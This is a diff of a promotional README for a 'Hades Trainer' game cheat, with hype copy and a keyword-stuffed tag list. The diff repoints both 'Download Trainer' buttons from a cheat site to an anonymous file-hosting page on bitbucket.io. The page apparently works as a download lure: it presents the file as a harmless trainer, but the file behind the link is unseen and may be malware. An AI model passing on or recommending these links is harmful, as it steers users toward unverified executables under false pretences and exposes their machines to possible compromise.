@@ -4,7 +4,7 @@
 
 Ready to bend the rules of the Underworld?
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/hades/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🎮 What Is a Hades Trainer?
@@ -18,7 +18,7 @@ Usually includes:
 * Resource boosts
 * Gameplay modifiers like room skips or cast spam
 
-[![Download Trainer](https://gameguru.ru/media/tinymce_images/mceclip0_4t9RZaM.png)](https://wecheaters.github.io/cheats/hades/)
+[![Download Trainer](https://gameguru.ru/media/tinymce_images/mceclip0_4t9RZaM.png)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔥 Core Features of a Hades Trainer
@@ -111,3 +111,4 @@ hades trainer, infinite health hades, cheat trainer hades, god mode hades pc, un
 
 **Why suffer when you can slay like a true god?**
 With a **Hades Trainer**, every run is YOUR story — no deaths, no limits, just raw Olympian power. ⚔️🔥💀
+
